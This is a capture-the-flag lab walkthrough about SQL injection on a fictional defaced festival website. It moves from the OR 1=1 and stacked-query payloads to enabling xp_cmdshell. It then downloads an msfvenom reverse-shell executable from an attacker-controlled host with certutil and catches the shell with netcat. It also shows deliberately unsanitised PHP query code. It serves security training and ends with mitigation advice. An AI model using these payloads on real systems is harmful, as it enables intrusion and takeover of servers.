The Best Festival Company started receiving many reports that their company website, bestfestival.thm, is displaying some concerning information about the state of Christmas this year! After looking into the matter, Santa's Security Operations Center (SSOC) confirmed that the company website has been hijacked and ultimately defaced, causing significant reputational damage. To make matters worse, the web development team has been locked out of the web server as the user credentials have been changed. With no other way to revert the changes, Elf Exploit McRed has been tasked with attempting to hack back into the server to regain access.

After conducting some initial research, Elf Forensic McBlue came across a forum post made on the popular black hat hacking internet forum, JingleHax. The post, made earlier in the month, explains that the poster is auctioning off several active vulnerabilities related to Best Festival Company systems:

![ac67b7cf8eeb68f8847613a1a5f7e03f](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/511f063c-f08e-4d51-8b29-01d4deafcf9f)

This forum post surely explains the havoc that has gone on over the past week. Armed with this knowledge, Elf Exploit McRed began testing the company website from the outside to find the vulnerable components that led to the server compromise. As a result of McRed's thorough investigation, the team now suspects a possible SQL injection vulnerability.

**Learning Objectives**

In today's task, you will:

- Learn to understand and identify SQL injection vulnerabilities
- Exploit stacked queries to turn SQL injection into remote code execution
- Help Elf McRed restore the Best Festival website and save its reputation!

**SQL**

Structured query language (SQL) is essential for working with relational databases and building dynamic websites. Even if you've never explicitly used SQL before, chances are you frequently interact with databases. Whether you're checking your bank account balance online, browsing through products on an e-commerce website, or posting a status on social media, you're indirectly querying and altering databases. SQL is one of the most popular languages that make this all possible.

Relational databases are structured data collections organised into tables, each consisting of various rows and columns. Within these collections, tables are interconnected with predefined relationships, facilitating efficient data organisation and retrieval. For example, an e-commerce relational database might include tables for "customers", "orders", and "products", with relationships defined to link customer information to their respective orders through the use of identifiers:

![1111](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/49e9fa82-1194-4dc6-a69d-93cd4556fb8d)

SQL provides a rigid way to query, insert, update, and delete the data stored in these tables, allowing you to retrieve and alter databases as needed. A website or application that relies on a database must dynamically generate SQL queries and send them to the database engine to fetch or update the necessary data. The syntax of SQL queries is based on English and consists of structured commands using keywords like SELECT, FROM, WHERE, and JOIN to express operations in a natural, language-like way.

We'll leverage an example of a database table to represent the tracking and cataloguing of Christmas tree ornaments. The table and column structure might look something like this:

|ornament_id  |elf_id  |colour  |category  |material  |date_created  |price  |
|---|---|---|---|---|---|---|
|1  |124  | Red | Ball |  Glass|  2023-12-04	| 5.99 |
| 2 | 116 |  Gold| Star |  Metal| 2023-12-04	 | 7.99 |
| 3 |  102| Green | Tree | Wood | 2023-12-05	 | 3.99 |
| 4 |  102|  Silver|  Snowflake| Plastic |2023-12-07	  | 2.49 |

In the simple example above, we have defined a database table (```tbl_ornaments```) to store ornaments with various columns that provide characteristics or qualities related to each item.

We can run various SQL queries against this table to retrieve, update, or delete specific data. For example:

```
SELECT * FROM tbl_ornaments WHERE material = 'Wood';
```

This SELECT statement returns all columns for the ornaments where the material is specified as "Wood".

```
SELECT ornament_id, colour, category FROM tbl_ornaments WHERE elf_id = 102;
```

This SELECT statement will return all the ornaments created by the Elf with the ID 102. Unlike the first statement, this query only returns the ornament's ID, colour, and category.

```
INSERT INTO tbl_ornaments (ornament_id, elf_id, colour, category, material, date_created, price) VALUES (5, 105, 'Blue', 'Star', 'Glass', '2023-12-10', 4.99);
```

This INSERT statement adds a new ornament to the table created by the Elf with the ID 105 and the specified values for each column.

**PHP**

PHP is a popular general-purpose scripting language that plays a crucial role in web development. It enables developers to create dynamic and interactive websites by generating HTML content on the server and delivering it to the client's web browser. PHP's versatility and seamless integration with SQL databases make it a powerful tool for building feature-rich, dynamic web applications.

PHP is a server-side scripting language, meaning the code is executed on the web server before the final HTML is sent to the user's browser. Unlike client-side technologies like HTML, CSS, and JavaScript, PHP allows developers to perform various server-side tasks, such as connecting to a wide range of databases (such as MySQL, PostgreSQL, and Microsoft SQL Server), executing SQL queries, processing form data, and dynamically generating web content.

![22222](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/9a9b0604-5d21-4a18-89d8-bf55dff27160)

The most common way for PHP to connect to SQL databases is using the PHP Data Objects (PDO) extension or specific database server drivers like mysqli for MySQL or sqlsrv for Microsoft SQL Server (MSSQL). The connection is typically established by providing parameters such as the host, username, password, and database name.

After establishing a database connection, we can execute SQL queries through PHP and dynamically generate HTML content based on the returned data to display information such as user profiles, product listings, or blog articles. Returning to our example, if we want our PHP script to fetch information regarding any green-coloured ornaments, we could introduce the following lines:

```
// Execute an SQL query
$query = "SELECT * FROM tbl_ornaments WHERE colour = 'Green'";
$result = sqlsrv_query($conn, $query);
```

In the above snippet, we first save our SQL query into a variable named $query. This query instructs the database to retrieve all rows from the tbl_ornaments table where the "colour" column is set to "Green". We then use the sqlsrv_query() function to execute this query by passing it to a database connection object ($conn).

You can think of the $result variable as a container that holds the outcome of the SQL query, allowing you to iterate through the rows and access the data within those rows. Later in the script, you can use this result object to fetch and display data, making it a crucial part of the process when working with databases in PHP.

**User Input**

While the ability to execute SQL queries in PHP allows us to interact with our database, the real power of database-driven web applications lies in making these queries dynamic. In our previous example, we hardcoded the query to fetch green ornaments. However, real-world applications often require users to interact with the data. For instance, let's imagine we want to provide users with the ability to search for ornaments of their choice. In this case, we need to create dynamic queries that can be adjusted based on user input.

One common way to take in user-supplied data in web applications is through GET parameters. These parameters are typically appended to the URL and can be accessed by PHP. They allow users to specify their search criteria or input, making it a valuable tool for interactive web applications.

We could create a simple search form with an input field for users to specify the colour of ornaments they want. Upon submitting the form, the website makes a GET request to the search results page, including the user's search parameters within the URL. PHP can access the user's input as a GET parameter and dynamically generate a query based on that input.

```
// Retrieve the GET parameter and save it as a variable
$colour = $_GET['colour'];

// Execute an SQL query with the user-supplied variable
$query = "SELECT * FROM tbl_ornaments WHERE colour = '$colour'";
$result = sqlsrv_query($conn, $query);
```

The above snippet sets the $colour variable to the retrieved value of the "colour" URL parameter. That variable then gets passed into the $query string.

Now, users can dynamically control the query being executed by the database simply by modifying the URL parameter they include in their request. For example:

```
http://example.thm/ornament_search.php?colour=Green
```

![f](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/f33f9426-baa0-4aa9-a71a-3346a9eef122)

This simple example shows how powerful PHP and SQL can be in creating rich, dynamic websites.

**SQL Injection (SQLi)**

Taking in user-supplied input gives us powerful ways to create dynamic content, but failing to secure this input correctly can expose a critical vulnerability known as SQL injection (SQLi). SQL injection is an attack technique that exploits how web applications handle user input, particularly in SQL queries. Instead of providing legitimate input (like the ornament colour in the example above), the attacker injects malicious SQL statements into a web application's input fields or parameters. The application's database server then executes this rogue SQL query.

SQL injection vulnerabilities pose a considerable risk to web applications as they can lead to unauthorised access, data theft, data manipulation, or even the complete compromise of a web application and its underlying database through remote code execution. If an attacker can control which queries the database executes, they can control the database functions performed and the data returned. As such, the impact can be catastrophic, ranging from exposing sensitive user information to causing significant data breaches.

SQL injection vulnerabilities continue to be highly pervasive despite numerous advancements to mitigate them. This type of vulnerability is featured prominently in the OWASP Top 10 list of critical web application security risks (A03:2021-Injection).

When a web application incorporates user input into SQL queries without proper validation and sanitisation, it opens the door to SQL injection. For example, consider our previous PHP code for fetching user input to search for ornament colours:

```
// Retrieve the GET parameter and save it as a variable
$colour = $_GET['colour'];

// Execute an SQL query with the user-supplied variable
$query = "SELECT * FROM tbl_ornaments WHERE colour = '$colour'";
$result = sqlsrv_query($conn, $query);
```

Without adequate security measures, an attacker could manipulate the "colour" parameter to execute malicious SQL queries. For instance, instead of searching for a benign colour, they might input ' OR 1=1 -- as the input parameter, which would transform the query into:

```
SELECT * FROM tbl_ornaments WHERE colour = '' OR 1=1 --'
```

As the query above shows, the attacker injected the malicious payload into the dynamic query. Let's take a look at the payload in more detail:

- ' OR is part of the injected code, where OR is a logical operator in SQL that allows for multiple conditions. In this case, the injected code appends a secondary WHERE condition in the query.
- 1=1 is the condition following the OR operator. This condition is always true because, in SQL, 1=1 is a simple equality check where the left and right sides are equal. Since 1 always equals 1, this condition always evaluates to true.
- The -- at the end of the input is a comment in SQL. It tells the database server to ignore everything that comes after it. Ending with a comment is crucial for the attacker because it nullifies the rest of the query and ensures that any additional conditions or syntax in the original query are effectively ignored.
- The condition colour = '' is empty, and the OR 1=1 condition is always true, effectively making the entire WHERE condition true for every row in the table.

![colour](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/adc2bd2b-c60c-48c2-b3ab-b7522504cf48)

As a result, this SQL injection successfully manipulates the query to return all rows from the tbl_ornaments table, regardless of the actual ornament colour values. This is a classic example of an SQL injection payload, where the attacker leverages the OR 1=1 condition to bypass any intended conditions or logic in the query and retrieve data they are not supposed to access.

**A Caution Around OR 1=1**

It's crucial to emphasise the potential risks of using the OR 1=1 payload. While commonly used for illustration, injecting it without caution can lead to unintended havoc on a database. When injecting OR 1=1 into a query, the intention is typically to bypass authentication or to return all items in a table by making the condition always true. However, the risks lie in that you might not be aware of the context and scope of the query you're injecting into. Additionally, applications may sometimes use values from an initial request in multiple SQL queries. SQL injection payloads that return all rows can lead to unintended consequences when injected into different types of statements, such as UPDATE or DELETE.

Imagine injecting it into a query that updates a specific user's information. An OR 1=1 payload would make the condition true for every row, leading to a mass update affecting all records (users) in the table. This lack of specificity in the payload makes it a risky choice for penetration testers who might inadvertently cause significant data loss or alterations. A safer example would be a more targeted condition based on a known attribute identifying the record you want to manipulate. For instance, bob' AND 1=1-- would update Bob's record, while bob' AND 1=2-- would not. This still demonstrates the SQL injection vulnerability without putting the entire table's records at risk.

For a practical example, check out the Lesson Learned? room.

Fortunately, the development team behind the Best Festival website has confirmed that the website does not run any unpredictable queries and has permitted us to use this payload to demonstrate the vulnerability.

**Stacked Queries**

SQL injection attacks can come in various forms. A technique that often gives an attacker a lot of control is known as a "stacked query". Stacked queries enable attackers to terminate the original (intended) query and execute additional SQL statements in a single injection, potentially leading to more severe consequences such as data modification and calls to stored procedures or functions.

In SQL, the semicolon typically signifies one statement's conclusion and another's commencement. This feature facilitates the execution of multiple SQL statements within a single interaction with the database server. It's important to note that certain web application technologies and database management systems (DBMS) may demand different syntax or lack support for stacked queries. Consequently, enumeration is essential for precision when conducting injection attacks.

Suppose our attacker in the previous example wants to go beyond just retrieving all rows and intends to insert some malicious data into the database. They can modify the previous injection payload to this:

```
' ; INSERT INTO tbl_ornaments (elf_id, colour, category, material, price) VALUES (109, 'Evil Red', 'Broken Candy Cane', 'Coal', 99.99); --
```

When the web application processes this input, here's the resulting query the database would execute:

```
SELECT * FROM tbl_ornaments WHERE colour = '' ; INSERT INTO tbl_ornaments (elf_id, colour, category, material, price) VALUES (109, 'Evil Red', 'Broken Candy Cane', 'Coal', 99.99); --'
```

As a result, the attacker successfully ends the original query using a semicolon and introduces an additional SQL statement to insert malicious data into the tbl_ornaments table. This showcases the potential impact of stacked queries, allowing attackers to not only manipulate the retrieved data but also perform permanent data modification.

**Testing for SQL Injection**

A vector graphic of Exploit McRed. He is a tiny elf, sporting a red beanie as he is on the red team. He has a long beard and is leaning on a candy cane. In one hand, he is holding a bag adorned with a skull. Inside the bag contains seemingly malicious magical exploits.
Testing for SQL injection is a critical aspect of web application security assessment. It involves probing the application to identify vulnerabilities where an attacker can manipulate user-supplied input to execute unauthorised SQL queries.

To continue our mission, let's navigate to the defaced Best Festival Company website to see if we can identify vulnerable input that leads to SQL injection. If you haven't already, click the Start Machine button in the top-right corner of this task. Please allow the machine at least 5 minutes to fully deploy before interacting with it. You can use either your VPN connection or the AttackBox by clicking the blue Start AttackBox button at the top.

From here, visit http://MACHINE_IP in the web browser. You should see the defaced Best Festival Company website.

Navigating the website as an end-user to understand its functionality and offerings is a great place to start. This manual enumeration allows us to identify the areas in the application where user input is accepted and used in SQL queries. This can include search fields, login forms, and any input fields that interact with a database. You may need to navigate to the correct page containing the vulnerable component, so be sure to click on any buttons or links you find.

Browse the website manually until you find a form that accepts user input and might be querying a database. After locating the Gift Search feature, we can confirm our suspicions by simply filling out the form with the expected values:

![gifff](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/58b66aa7-d187-4279-8f81-bb82201f681b)

After clicking Search, the website redirects us to the results page. We can identify some interesting URL query parameters by looking at the URL in our browser:

```http://MACHINE_IP/giftresults.php?age=child&interests=toys&budget=30```

The underlying PHP code is taking in the three parameters we specified for age, interests, and budget (as separated by the & character) and querying the database to retrieve the filtered results and output them to the page.

Now that we've identified an area of the website where user input is accepted and used to generate dynamic SQL queries, we can test if it's vulnerable to any injection attack. To do this, we can alter the parameters to test how the application handles unexpected characters.

To test the input fields, we can submit characters like single quotes (') and double quotes ("), as these are special characters that attackers use to manipulate SQL queries. We might be able to trigger error messages by introducing possible syntax errors in the query and prove that the input is unsanitised as it reaches the back end. However, the Gift Search feature doesn't offer any free-form text inputs for us to type and manipulate, so we can look at modifying the URL parameters directly to test the application.

To do this, alter the age parameter in the URL to include just a single quote (') and hit Enter to load the page:

```http://MACHINE_IP/giftresults.php?age='&interests=toys&budget=30```

You should now see an error message returned!

![gift](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/6dd4a25a-2b2f-4ab5-8980-116467b05b1a)

The error we received is a huge breakthrough, as it gives us many details on the underlying database management system powering this website and confirms that the user input is unsanitised. This error message shows that Microsoft SQL Server is the database manager due to the banners and driver information between the square brackets.

The information we gathered will soon be helpful; error message enumeration is critical to SQL injection testing because it equips attackers with valuable information for crafting more precise and effective attack payloads. Because of this, it's always essential to monitor and sanitise error messages to prevent sensitive information from leaking.

Although we don't have access to the source code, at this point, we can visualise what the underlying PHP script might look like:

```
$age = $_GET['age'];
$interests = $_GET['interests'];
$budget = $_GET['budget'];

$sql = "SELECT name FROM gifts WHERE age = '$age' AND interests = '$interests' AND budget <= '$budget'";

$result = sqlsrv_query($conn, $sql);
```

As seen above, the script is likely extracting the values from the URL parameters in an unsanitised way, directly inserting them into the SQL query to be executed. If we break out of the hardcoded query by injecting our own SQL syntax, we can manipulate the request and, consequently, the returned data.

Let's attempt to leverage the SQL injection payload from earlier to inject our own condition on the Gift Search feature that will always evaluate to true:

```http://MACHINE_IP/giftresults.php?age=' OR 1=1 --```

By injecting our payload and commenting out the rest of the query, we can bypass the intended filter and avoid errors to retrieve all gift results, regardless of the specified parameters.

![search](https://github.com/schoto/Advent-of-Cyber-2023/assets/69323411/8feb6e62-53d4-42fe-bac1-34989518f4fa)

We have successfully "dumped" the database table and returned all 636 rows to the page. This is a very simple example and a suitable proof of concept that this website is vulnerable to SQL injection. However, it's unlikely that the attacker who defaced the Best Festival Company did so by returning gift results. Let's explore possible methods to execute system commands via our newly found attack vector.

Calling Stored Procedures

As mentioned, stacked queries can be used to call stored procedures or functions within a database management system. You can think of stored procedures as extended functions offered by certain database systems, serving various purposes such as enhancing performance and security and encapsulating complex database logic.

A Microsoft SQL Server stored procedure, xp_cmdshell, is a specific command that allows for executing operating system calls. If we can exploit a stacked query to call a stored procedure, we might be able to run operating system calls and obtain remote code execution. As we previously confirmed, the database system in our example is Microsoft SQL Server. With that in mind, let's dive deeper into the xp_cmdshell procedure.

xp_cmdshell

xp_cmdshell is a system-extended stored procedure in Microsoft SQL Server that enables the execution of operating system commands and programs from within SQL Server. It provides a mechanism for SQL Server to interact directly with the host operating system's command shell. While it can be a powerful administrative tool, it can also be a security risk if not used cautiously when enabled.

Because of the known risks involved, it's recommended that this functionality is disabled on production servers (and is by default). However, due to misconfigurations and legacy applications that require it, it's common to see it enabled in the wild. For example, suppose you have an HR management system that needs to export data periodically to a CSV file and upload it to an external server. Instead of using more secure and modern methods like SQL Server Integration Services (SSIS) or custom application code, legacy applications may have opted to rely on xp_cmdshell to execute system-level commands to export the data. While this accomplishes the same task, it poses security and maintainability risks and grants excessive system access to the SQL Server.

It is also possible to manually enable xp_cmdshell in SQL Server through EXECUTE (EXEC) queries. Still, it requires the database user to be a member of the sysadmin fixed server role or have the ALTER SETTINGS server-level permission to execute this command. However, as mentioned previously, misconfigurations that allow this execution are not too uncommon.

We can attempt to enable xp_cmdshell on the Best Festival Company database by stacking the following commands using the SQL injection we discovered:

```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```

By injecting the above statements into SQL Server, we'll first enable advanced configuration options in SQL Server by setting show advanced options to 1. We then apply the change to the running configuration via the RECONFIGURE statement. Next, we enable the xp_cmdshell procedure by setting xp_cmdshell to 1 and applying the change to the running configuration again.

Converting these into a single stacked SQLi payload will look like this:

```
http://MACHINE_IP/giftresults.php?age='; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; --
```

By requesting the URL with these parameters, we should be able to execute the stacked queries and enable the xp_cmdshell procedure. With this feature enabled, we can execute any Windows shell command through the EXECUTE (or EXEC) statement followed by the command name.

Unfortunately, one of the caveats to this approach is that it returns its results as rows of text. This means that, typically, the output will never be returned to the user since the injection no longer occurs in the original, intended query. Because of this, we are often in the dark as to whether our injection worked. But there are ways to validate whether or not our approach is working.

Remote Code Execution

Let's confirm if we have remote code execution by attempting to execute certutil.exe on the target machine. This command is a native Windows command-line program installed as part of Certificate Services. It's handy in engagements because it is a binary signed by Microsoft and allows us to make HTTP/s connections. In our scenario, we can use it to make an HTTP request to download a file from a web server that we control to confirm that the command was executed. To set this up, let's create a malicious payload using MSFvenom, allowing us to eventually upgrade our SQL-injected "shell" into a more standard reverse shell.

You can think of a reverse shell as the remote computer (the Best Festival web server) initiating a connection back to our AttackBox, which we're listening for. Once the connection is established, we can gain control of the remote system and interact with the target machine directly. This is the opposite of a typical remote access scenario, where the user is the client and the target machine is the server.

MSFvenom is a command-line payload generation tool. It's part of the Metasploit Framework, a widely used penetration testing and ethical hacking set of utilities. MSFvenom is explicitly designed for payload generation and can be used to generate a Windows executable that, when executed, will make a reverse shell connection back to our AttackBox. We can run the following command on a Kali machine (or the AttackBox):

Generate an MSFvenom Payload
msfvenom -p windows/x64/shell_reverse_tcp LHOST=YOUR.IP.ADDRESS.HERE LPORT=4444 -f exe -o reverse.exe
Note: Change the LHOST argument to your AttackBox's IP address. You can obtain your AttackBox's IP address by clicking the Machine Information icon at the bottom, or by running ifconfig ens5 | grep -oP 'inet \K[\d.]+' in your terminal.

It will take a moment to generate, but once complete, you will have created a reverse.exe Windows executable file that will establish a reverse TCP connection to your IP address over port 4444 when executed on the target.

With our payload created, we can set up a quick HTTP server on our AttackBox using Python to serve the file:

Start a Python HTTP Server
python3 -m http.server 8000
By running the above command, we will set up a lightweight web server on port 8000 that we can use to serve our payload. All the files in our current directory, including reverse.exe, will be served using this method and will be accessible for the Best Festival server to download.

It's time to use our stacked query to call xp_cmdshell and execute the certutil.exe command on the target to download our payload.

http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'certutil -urlcache -f http://YOUR.IP.ADDRESS.HERE:8000/reverse.exe C:\Windows\Temp\reverse.exe'; --
Note: Ensure to fill in your AttackBox's IP address in the URL.

The above SQL statement will call certutil to download the reverse.exe file from our Python HTTP server and save it to the Windows temp directory for later use. After requesting the above URL to execute the stacked query, we should immediately know if we were successful by checking the output of our HTTP server. There should be a request for reverse.exe:

Python HTTP Server Request
└─$ python3 -m http.server 8000  	 
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
MACHINE_IP - - [10/Dec/2023 14:20:59] "GET /reverse.exe HTTP/1.1" 200 -
Great progress! We've achieved remote code execution and now have our reverse shell payload on the target system. All we have to do now is set up a listener to catch the shell and then have the system execute the payload executable. To set up our listener, we can use the netcat utility on the AttackBox to listen on port 4444 (the same port we specified in our payload). Netcat is a versatile networking utility that can be used for reading from and writing to network connections.

You can press Ctrl + C in the terminal to first close your Python HTTP server. Alternatively, you can open up a new terminal window.

Start a netcat Listener
nc -lnvp 4444
Now, we can run one final stacked query to execute the reverse.exe file we previously saved in the C:\Windows\Temp directory:

http://MACHINE_IP/giftresults.php?age='; EXEC xp_cmdshell 'C:\Windows\Temp\reverse.exe'; --
After requesting the above URL, return to your netcat listener terminal window. You should see that we caught the shell and made the connection!

Catching the Reverse Shell
└─$ nc -lnvp 4444
listening on [any] 4444 ...
connect to [10.10.10.10] from (UNKNOWN) [MACHINE_IP] 49730
Microsoft Windows [Version 10.0.17763.1821]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Windows\system32>whoami
whoami
nt service\mssql$sqlexpress
With that, we now have a reverse shell connection into the Best Festival web server we were previously locked out of. Now, it's time to use our new-found access and restore the defaced content!

Restore the Website

Now that we have gained interactive control over the web server, let's see if any clues might help us restore the site. Exploring the system's Users directory (C:\Users) is a good place to start. This directory holds documents and information for each user profile on the system.

It's worth mentioning that another legacy misconfiguration has worked in our favour, providing the SQL Server service account we connected with Administrator-level permissions on the system. This higher level of access may provide us with the capabilities we need to investigate and rectify the issue. Navigate to the Users directory (C:\Users) and explore the Administrator folder. Here, we'll search the sub-directories for hints or files that can guide us in restoring the website and saving the Best Festival Company's reputation!

Conclusion

With Elf Exploit McRed's determination and cunning, the Best Festival Company's website was restored to its former glory! The joyful enchantment was woven back into the pages, and access to the server was regained. With your help, the team can now focus on completing the incident response process, ensuring that Christmas preparations are back on schedule, and investigating who was behind that mysterious forum post.

A group photo illustration of the Best Festival Company's key characters. From left to right: Elf Exploit McRed, in his signature red hat. Elf Forensic McBlue is bending over and holding a magnifying glass. McSkidy, the tallest one in the group, leads the team as she wears a Santa hat and a green jacket. Elf Pivot McRed stood confidently with his arms crossed. Elf Admin McBlue is jumping for joy in the air. Elf Log McBlue is holding a device that looks like a tablet, with green 1s and 0s repeating. And lastly, Elf Recon McRed, looking off to the right out of a telescope.

To protect your applications and data from SQL injection attacks, consider following these coding best practices:

Input validation: Sanitise and validate all user-supplied input to ensure it adheres to expected data types and formats. Reject any input that doesn't meet validation criteria.
Parameterised statements: Use prepared statements and parameterised queries in your database interactions. Parameterised queries automatically escape user input, making it difficult for attackers to inject malicious SQL.
Stored procedures: Use stored procedures to encapsulate your SQL logic whenever possible. This reduces the risk of SQL injection by separating user input from SQL code.

**Q/A**

